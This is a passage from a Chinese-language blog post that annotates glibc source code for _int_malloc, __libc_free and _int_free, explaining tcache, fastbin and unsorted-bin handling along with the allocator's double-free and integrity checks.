class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>以上便是<code>_int_malloc</code>的全部流程。概括来说是这样的(感觉我这个写法也是没谁了2333，能理解就行)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">_int_malloc</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(请求的大小比满足fastbin范围)</span><br><span class="line">    &#123;</span><br><span class="line">        去fastbin中找</span><br><span class="line">        <span class="keyword">if</span>(找到了)</span><br><span class="line">        &#123;</span><br><span class="line">           进行fastbin reverse into tcache </span><br><span class="line">            <span class="keyword">return</span> 指针</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(请求的大小比满足smallbin范围)</span><br><span class="line">    &#123;</span><br><span class="line">        去smallbin中找</span><br><span class="line">        <span class="keyword">if</span>(找到了)</span><br><span class="line">        &#123;</span><br><span class="line">           进行small reverse into tcache </span><br><span class="line">            <span class="keyword">return</span> 指针</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//大小位于large bin</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(有fastchunks)</span><br><span class="line">            malloc_consolidate合并堆块</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(unsorted bin非空) <span class="comment">//在unsorted bin中找合适的,遍历unsorted bin中的victim</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(满足一定条件)<span class="comment">//具体条件上面分析过,这里的目的是理解整个流程而非细节</span></span><br><span class="line">                切割</span><br><span class="line">                <span class="keyword">return</span> 指针</span><br><span class="line">            <span class="keyword">if</span>(大小正合适)</span><br><span class="line">                <span class="keyword">return</span> 指针<span class="comment">//或者放tcache中，等下次循环的时候来取</span></span><br><span class="line">            <span class="keyword">if</span>(victim在small bin范围)</span><br><span class="line">                一些操作</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">                一些操作</span><br><span class="line">             把victim链进small bin或者large bin</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(请求大小满足large bin)</span><br><span class="line">        &#123;</span><br><span class="line">            到相应大小的large bin中取</span><br><span class="line">             如果切割完有剩余，放unsorted bin中</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(;;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//如果相应的large bin没有，则到更大的large bin中去取然后切割</span></span><br><span class="line">            找完了还找不到，<span class="keyword">goto</span> use_top</span><br><span class="line">        &#125;</span><br><span class="line">        use_top:</span><br><span class="line">        <span class="keyword">if</span>(top chunk大小合适)</span><br><span class="line">        切割</span><br><span class="line">                <span class="keyword">return</span> 指针</span><br><span class="line">             <span class="keyword">else</span> <span class="keyword">if</span>(不合适，但是有fastchunks)</span><br><span class="line">                 malloc_consolidate合并堆块</span><br><span class="line">             <span class="keyword">else</span>: <span class="comment">//不合适，而且没有fastchunks</span></span><br><span class="line">        sysmalloc分配</span><br><span class="line">                    <span class="keyword">return</span>指针</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>我们来看看这个free的过程，同样的，free是由<code>__libc_free</code>实现的,会调用<code>_int_free</code>。我们这里先看看<code>__libc_free</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Quickly check that the freed pointer matches the tag for the memory.</span></span><br><span class="line"><span class="comment">     This gives a useful double-free detection.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="keyword">char</span> *)mem;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> err = errno;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment"> Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Mark the chunk as belonging to the library again.  */</span></span><br><span class="line">      (<span class="keyword">void</span>)tag_region (chunk2mem (p), memsize (p));</span><br><span class="line"></span><br><span class="line">      ar_ptr = arena_for_chunk (p);</span><br><span class="line">      _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __set_errno (err);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure><p>有个判断chunk是否是mmaped，如果不是则会进行一个Tcache初始化，然后调用<code>_int_free</code>。一般来说不是mmaped的，所以我们直接看<code>_int_free</code>好了。这个函数比较短，就300多行。</p><p>其实在<code>_int_free</code>中我们可以发现并没有直接放入small bin和large bin的操作，有的只有放unsorted bin以及tcache bin与fastbin。那么在哪里放的呢？其实就是前面分析过的<code>_int_malloc</code>过程，把放入unsorted bin中的chunk进行一个进一步整理，放入small bin以及large bin。</p><p>首先是一些声明以及检查的工作，这里主要检查的是指针合法性以及chunk头部字段是否正确</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后是tcache bin的逻辑，如果我们free的chunk大小在tcache bin范围内，就会有如下逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line">        <span class="comment">//这是一种double free的检测。当chunk放入tcache bin的时候，key字段会被赋为tcache_key。所以key字段位置上是tcache_key的时候有可能会有double_free(只是有可能，因为也有可能用户的数据刚好就是tcache_key呢)</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    <span class="keyword">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)<span class="comment">//tcache bin中元素不合理，过多了</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))<span class="comment">//没有对齐</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (tmp == e) <span class="comment">//double free检测，该bin上的某个链上已经有了e</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">//tcache bin还没满，就放进去</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果大小在fastbin范围内，则进行如下逻辑。首先是进行一系列检查，然后调用<code>free_perturb</code>清空之后，根据是否多线程选择相应的过程进行放入fastbin的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">      ) &#123;</span><br><span class="line"><span class="comment">//进行一些判断</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">  &lt;= CHUNK_HDR_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= CHUNK_HDR_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//清内容</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line">        <span class="comment">//检查double free等</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">        <span class="comment">//把chunk链入 fastbin中</span></span><br><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">     add (i.e., double free).  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">      <span class="comment">//把chunk链入 fastbin中</span></span><br><span class="line">  old2 = old;</span><br><span class="line">  p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后如果大小不再fastbin中，并且也不是mmaped来的，进入到了<code>else if (!chunk_is_mmapped(p))</code>的逻辑</p><p>下面的是<code>else if (!chunk_is_mmapped(p))</code>范围里面的一些代码</p><p>首先还是进行一系列检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!have_lock)</span><br><span class="line">    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">      top block.  */</span></span><br><span class="line"> <span class="comment">//p是top chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">  <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="comment">//检查next chunk是否超过了arena的范围</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">      &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">      &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">  <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="comment">//检查next chunk的prev inuse</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="comment">//检查next chunk的size的合理性</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= CHUNK_HDR_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);</span><br></pre></td></tr></table></figure><p>然后根据该chunk的物理相邻前后chunk判断是否要进行合并操作。这里注意需要对后面的chunk是否为top chunk进行一个判断，如果是top chunk要合并到top chunk中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="comment">//如果前面的chunk是free状态的，则向前吞并chunk</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      <span class="comment">//把前面的chunk给unlink掉</span></span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//判断后面一个chunk是否为top chunk，如果不是则进入此分支</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果后面的chunk没有被使用，则unlink掉后面的chunk，然后增加size</span></span><br><span class="line">unlink_chunk (av, nextchunk);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>); <span class="comment">//否则清除后面chunk的pre_inuse位</span></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"><span class="comment">//把合并(也有可能没合并)后的chunk放入unsorted bin中</span></span><br><span class="line">      